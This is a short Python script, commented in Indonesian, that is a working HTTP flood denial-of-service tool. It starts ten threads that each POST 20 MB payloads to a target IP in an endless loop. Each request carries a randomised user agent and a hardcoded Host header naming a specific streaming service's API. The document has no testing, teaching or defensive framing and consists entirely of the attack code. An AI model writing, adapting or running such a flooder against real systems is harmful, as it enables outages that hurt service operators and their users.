import sys
import requests
import threading
from fake_useragent import UserAgent

# Fungsi untuk mengirimkan permintaan HTTP yang intensif
def send_http_requests(url, num_requests):
    for _ in range(num_requests):
        payload = "x" * 20000000 
        user_agent = UserAgent().random
        headers = {'Host': 'api.visionplus.id', 'Connection': 'Keep-Alive', 'User-Agent': user_agent, 'Upgrade': 'websocket'}
        while True:
            try:
                response = requests.post(url, data=payload, headers=headers)
                print(f"Response code: {response.status_code}")
            except Exception as e:
                print(f"Error: {e}")

# Fungsi untuk membuat banyak thread untuk mengirimkan permintaan HTTP secara bersamaan
def create_threads(num_threads, url, num_requests_per_thread):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_http_requests, args=(url, num_requests_per_thread))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Menerima alamat IP target dari argumen baris perintah
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <target_ip>")
        sys.exit(1)

    # URL yang akan dituju
    target_ip = sys.argv[1]
    url = f'http://{target_ip}'
    
    # Jumlah thread yang akan dibuat (setiap thread akan mengirimkan sejumlah permintaan)
    num_threads = 10
    
    # Jumlah permintaan yang akan dikirimkan oleh setiap thread
    num_requests_per_thread = 6500
    
    # Memulai proses mengirimkan permintaan HTTP yang intensif
    create_threads(num_threads, url, num_requests_per_thread)